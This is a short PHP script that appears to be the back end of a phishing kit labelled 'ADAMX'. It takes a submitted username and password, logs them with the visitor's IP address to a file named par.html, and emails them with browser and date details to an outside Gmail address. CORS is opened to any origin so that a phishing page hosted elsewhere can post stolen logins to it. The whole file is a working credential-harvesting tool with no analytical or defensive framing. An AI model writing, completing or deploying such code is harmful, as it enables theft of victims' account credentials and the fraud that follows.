<?php 
   header('Access-Control-Allow-Origin: *');
        header('Access-Control-Allow-Methods: POST, GET, DELETE, PUT, PATCH, OPTIONS');
        header('Access-Control-Allow-Headers: token, Content-Type');
        header('Access-Control-Max-Age: 1728000');
        header('Content-Length: 0');
        header('Content-Type: text/plain');
$ip = getenv("REMOTE_ADDR"); 
$datamasii=date("D M d, Y g:i a"); 
$e = $_REQUEST['access'] ;
$p = $_REQUEST['x1'] ;

$f = fopen("par.html", "a"); 
fwrite ($f, 'Username: [<b><font color="#570000">'.$e.'</font></b>] Password: [<b><font color="#57003A">'.$p.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>] By: [<b><font color="#005700"><a href="#" rel=""></a></font></b>]<br>');
fclose($f);

$mesaj = "------------ADAMX--------------

-----------ADAMX Logs-------------
Username : $e
Password : $p
IP:$ip
----------------------------------------------------
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."
DATE : $datamasii"; 


$subject = "ADAMX  LOGS";
mail('kaluru23@gmail.com', $subject, $mesaj);

?>





